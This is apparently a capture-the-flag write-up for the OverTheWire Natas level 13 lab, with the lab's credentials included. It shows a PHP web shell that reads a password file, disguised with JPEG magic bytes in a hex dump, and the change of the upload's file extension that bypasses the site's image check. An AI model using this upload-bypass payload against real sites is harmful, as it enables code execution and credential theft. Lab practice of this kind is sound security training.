# Natas Level 13

## 🧪 Credentials

- **URL**: `http://natas13.natas.labs.overthewire.org`
- **Username**: `natas13`
- **Password**: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

---

## 🖥️ Steps

1. Login to the website.
2. it's preety much same as the previous one. here we are dealing with the `magic signature` or `magic number`. it's basically a flag like thing that we add to a file then the server side think it's another file. in this case we will right the php script then add the `jpeg` magic signature and upload it. here is the `natas13.php`:
```
<?php
echo system('cat /etc/natas_webpass/natas14');
?>

```
3. you need to add some empty lines to the start of it because we will add flag and we don't want to overwrite the existing php script. i added the jpeg magic signature of `FF D8 FF E0`. here is the before and after:
```
before:
00000000   0A 0A 0A 0A  3C 3F 70 68  70 0A 65 63  68 6F 20 73  ....<?php.echo s
00000010   79 73 74 65  6D 28 27 63  61 74 20 2F  65 74 63 2F  ystem('cat /etc/
00000020   6E 61 74 61  73 5F 77 65  62 70 61 73  73 2F 6E 61  natas_webpass/na
00000030   74 61 73 31  34 27 29 3B  0A 3F 3E 0A               tas14');.?>.

after:
00000000   FF D8 FF E0  3C 3F 70 68  70 0A 65 63  68 6F 20 73  ....<?php.echo s
00000010   79 73 74 65  6D 28 27 63  61 74 20 2F  65 74 63 2F  ystem('cat /etc/
00000020   6E 61 74 61  73 5F 77 65  62 70 61 73  73 2F 6E 61  natas_webpass/na
00000030   74 61 73 31  34 27 29 3B  0A 3F 3E 0A               tas14');.?>.
```
4. go to inspect elements and go to `form` tag there is `the random_generated_name.jpg` change the `.jpg` to `php` like the previous level. now you're ready to go. upload it and here is the key.
```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
---
